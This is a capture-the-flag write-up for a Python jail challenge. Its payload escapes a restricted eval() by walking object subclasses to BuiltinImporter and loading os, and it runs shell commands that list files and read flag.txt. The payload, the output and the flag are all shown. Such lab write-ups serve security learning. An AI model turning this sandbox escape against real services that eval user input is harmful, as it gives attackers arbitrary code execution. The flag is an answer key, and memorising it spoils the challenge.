# Bonus: The Revenge of Checkpass 1

We're given a script

```python
def main():
 password = "the password can contain non-ascii charactérs :)"
 inp = input("Enter a Python list: ")
 lis = eval(inp, {'__builtins__': None}, None)
 if type(lis) != list:
   print("That's not a list")
   return
 for i in lis:
   if not isinstance(i, int):
     print("The list can only contain integers")
     return
 if lis == [ord(e) for e in password]:
   print("You are now authorized!")
   with open("flag.txt", "r") as flag:
     print(flag.read())
 else:
   print("Incorrect password!")


if __name__ == "__main__":
 main()
```

# Analysis

The **eval()** function is used to evaluate the input as a Python expression. The second and third arguments passed to **eval()** are **{'builtins': None}** and **None** respectively. This restricts the evaluation context by disabling access to built-in functions and limiting the evaluation to the expression itself.

# Solution

There no filtering or sanitizing in the input.
Notes:

1.  The input must be list
2.  If there not integer in the list it will print the list can only contain integers

We can do a list comprehension that retrieves the class named that we can exploit but we cannot retrieve the class name into output so therefore the note number 2 is important
if we pass empty list [] it will produce incorrect password

there so many class that we can exploit in this case i will use BuiltinImporter
and here is the payload

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter']
```

The list comprehension will iterate all base subclasses then if the class name is BuiltinImporter it will pass to the list
then we can read the output. if the output show incorrect password thats mean there no **BuiltinImporter** class
but in the program it show **“The list can only contain integers”** wich mean the class is available
then we can run the exploit with **BuiltinImporter** class

```python
Enter a Python list: [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0]().load_module('os').system('ls')
flag.txt
run
That's not a list
```

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0]().load_module('os').system('cat flag.txt')Enter a Python list:
ctf{pyth0n_s4ndb0x_br34k0ut_1f8bca}
That's not a list
```

**ctf{pyth0n_s4ndb0x_br34k0ut_1f8bca}**
